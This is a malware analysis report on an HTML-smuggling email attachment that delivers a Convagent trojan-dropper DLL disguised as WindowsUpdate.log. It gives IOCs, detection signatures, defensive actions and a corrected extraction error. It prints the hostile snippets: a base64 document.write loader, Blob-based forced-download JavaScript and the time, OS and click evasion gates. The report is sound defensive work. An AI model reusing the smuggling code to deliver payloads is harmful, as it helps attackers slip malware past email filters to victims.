

Case 04 html smuggling convagent · MD
# Case 04 — HTML Smuggling Delivering a Convagent Trojan-Dropper DLL
 
**Verdict:** Malicious — High confidence
**Sample SHA-256 (HTML):** `55a81d88fff3dc3de0e42724b0a992d4ef382b0e1a82187abf9d635ab89b2bae`
**Payload SHA-256 (DLL):** `7e6d5f6d00c8f2cfadf3fb0c9abbb19f5e291e80729db1c839c78fa4a5bad46c`
**File type:** HTML → drops PE32 DLL (3.7 MB)
**Source:** MalwareBazaar
**Analyzed:** Isolated REMnux VM, static analysis only (never executed or opened in a browser)
 
---
 
## Summary
 
An HTML attachment using **HTML smuggling** to deliver a Windows DLL. The malicious payload
travels as base64 text inside the HTML — invisible to file based email and network
scanning — and is reconstructed into a file by JavaScript in the victim's browser, then
force-downloaded disguised as `WindowsUpdate.log`. The payload is a 3.7 MB PE32 DLL
identified as the **Convagent** trojan-dropper family (VirusTotal 22/70). The kit includes
three distinct evasion mechanisms.
 
## Evidence
 
### 1. Smuggling mechanism (raw file)
 
The HTML opens with a decoy `<title>Loading...</title>` followed immediately by:
 
```javascript
<script>document.open();document.write(atob("PCFET0NUWVBFIGh0bWw+..."))</script>
```
 
`atob()` is JavaScript's base64 decoder. `document.write(atob(...))` decodes an embedded
base64 blob and writes it into the page **at render time**. Nothing malicious exists as a
file in transit — this is the defining characteristic of HTML smuggling and the reason it
bypasses attachment scanning.
 
The blob begins `PCFET0NUWVBF`, which decodes to `<!DOCTYPE` — confirming the smuggled
content is a further HTML document.
 
### 2. Layer 1 decode → dropper script
 
Decoding the first layer produced readable JavaScript (not a further encoded layer):
 
```javascript
var bl = new Blob([__pd], {type:"text/plain"});
var u = URL.createObjectURL(bl);
var a = document.createElement("a");
a.href = u;
a.download = "WindowsUpdate.log";
document.body.appendChild(a);
a.click();
setTimeout(function(){document.body.removeChild(a); URL.revokeObjectURL(u);}, 300);
```
 
Behaviour: assemble the embedded payload (`__pd`) into a Blob → create a download link →
name it **`WindowsUpdate.log`** (innocuous disguise) → **programmatically click it** to
force the download → clean up the DOM to reduce forensic traces.
 
### 3. Three evasion mechanisms
 
| Mechanism | Code | Purpose |
|---|---|---|
| **Time-based self-destruct** | `if(Date.now()>1786579199000){document.body.innerHTML="";}` | Blanks the page after the campaign window, defeating later analysis |
| **OS gating** | `currentOS==="Windows"` check | Only fires on Windows; wastes nothing on non target hosts |
| **Click gating** | `document.addEventListener("click", ...)` | Requires user interaction — defeats automated sandboxes that don't click |
 
### 4. Payload extraction and identification
 
| Property | Value |
|---|---|
| Encoded blob length | 5,233,848 base64 characters |
| Decoded size | **3,880,960 bytes (3.7 MB)** |
| `file` output | **PE32 executable (DLL) (console) Intel 80386, for MS Windows, 9 sections, stripped to external PDB** |
| SHA-256 | `7e6d5f6d00c8f2cfadf3fb0c9abbb19f5e291e80729db1c839c78fa4a5bad46c` |
 
The disguised `WindowsUpdate.log` is in fact a Windows DLL. Debug symbols are stripped —
a common anti-analysis measure.
 
### 5. Payload reputation — VirusTotal (22/70)
 
| Field | Value |
|---|---|
| Detection | **22 / 70** vendors |
| Popular threat label | `trojan.convagent/suspected` |
| Threat categories | **trojan, ransomware, downloader** |
| Family | **Convagent** |
| Tags | `pedll`, `detect-debug-environment`, `spreader` |
 
Selected vendor labels:
 
| Vendor | Label |
|---|---|
| Microsoft | `Trojan:Win32/Wacatac.B!ml` |
| ESET-NOD32 | `Win32/TrojanDropper.Agent.TFN` |
| Antiy-AVL | `Trojan[Ransom]/Win32.Convagent` |
| CrowdStrike Falcon | `Win/malicious_confidence_70%` |
| Rising | `Ransom.Convagent!8.123A1` |
| Elastic | `Malicious (high Confidence)` |
| SentinelOne | `Static AI - Suspicious PE` |
| Symantec | `ML.Attribute.HighConfidence` |
 
The `detect-debug-environment` tag confirms the payload *itself* carries anti-analysis
logic, consistent with the evasion built into the delivery HTML. The `spreader` tag
indicates self-propagation capability. The heavy proportion of ML/heuristic detections
(`!ml`, `Static AI`, `HighConfidence`) rather than exact signatures suggests a relatively
recent variant.
 
## Impact
 
A user opening the attachment on Windows and clicking anywhere on the page silently
receives a 3.7 MB trojan-dropper DLL disguised as a Windows log file. The dropper family is
associated with downloading further payloads and with ransomware delivery. The smuggling
delivery bypasses attachment-based filtering entirely.
 
## IOCs (defanged)
 
| Type | Value |
|---|---|
| SHA-256 (HTML) | `55a81d88fff3dc3de0e42724b0a992d4ef382b0e1a82187abf9d635ab89b2bae` |
| SHA-256 (payload DLL) | `7e6d5f6d00c8f2cfadf3fb0c9abbb19f5e291e80729db1c839c78fa4a5bad46c` |
| Dropped filename | `WindowsUpdate.log` (disguise for a PE DLL) |
| Campaign expiry timestamp | `1786579199000` |
| Family | Convagent (trojan / dropper / spreader) |
 
## Actions
 
- **Block** both hashes at the mail gateway and EDR.
- **Alert** on HTML attachments containing `document.write(atob(` — a high-fidelity
  smuggling signature that is independent of any single campaign.
- **Alert** on browser-initiated downloads of files whose extension does not match their
  content type (a `.log` that is a PE).
- **Hunt** endpoints for `WindowsUpdate.log` in browser download directories.
- **Hunt** for the payload hash across the estate; treat any hit as a probable infection
  given the `spreader` capability.
- **Consider** stripping or quarantining HTML attachments at the gateway — they have
  minimal legitimate business use and are a primary smuggling vector.
## Analyst note — extraction error and correction
 
The first payload extraction used a greedy character-class pattern:
 
```bash
grep -oE '__pd=[A-Za-z0-9+/=]+' decoded.html
```
 
This **silently truncated** the blob at the first non-matching character, yielding a
**12-byte** file. Because those 12 bytes happened to begin with `4d 5a` (`MZ`), the result
*appeared* to be a valid Windows executable, and VirusTotal returned 0/72 — which could
easily have been written up as "a confirmed but undetected executable."
 
The discrepancy was caught on a plausibility check: **12 bytes is impossible for a real
executable.** Re-extraction with a quote-delimited pattern (`grep -o '__pd="[^"]*"'`) and
`base64 -di` (to tolerate invalid characters) recovered the full 3.7 MB DLL, which
VirusTotal then identified as Convagent at 22/70.
 
The discarded artifact hash — `d930a77b4e5a6df96f8be687f754be90fa6da7939406d214814a80393847ce1b`
— is **not** an IOC and should not be used.
 
**Lesson applied:** validate that an extracted artifact's *size and structure* are
consistent with its claimed type before trusting a file-type identification or a reputation
result. A byte match on a truncated file is not proof of anything.
 
## Screenshots
 
| File | Shows |
|---|---|
| `55a-html.png` | Raw HTML — `document.write(atob(` and the base64 blob |
| `55a-script.png` | Decoded layer — `Date.now()` self-destruct and embedded payload blob |
| `55a-dropper.png` / `55a-login.png` | Dropper JavaScript — Blob → `WindowsUpdate.log` → `a.click()`, OS and click gates |
| `55a-exe.png` | **Error step** — truncated 12-byte extraction, `file: data`, coincidental `MZ` |
| `55a-payload-hash.png` | **Correct extraction** — 3,880,960 bytes, PE32 DLL, real SHA-256 |
| `55a-virustotal.png` | VirusTotal 22/70 — Convagent, trojan/ransomware/downloader, spreader, detect-debug-environment |
 
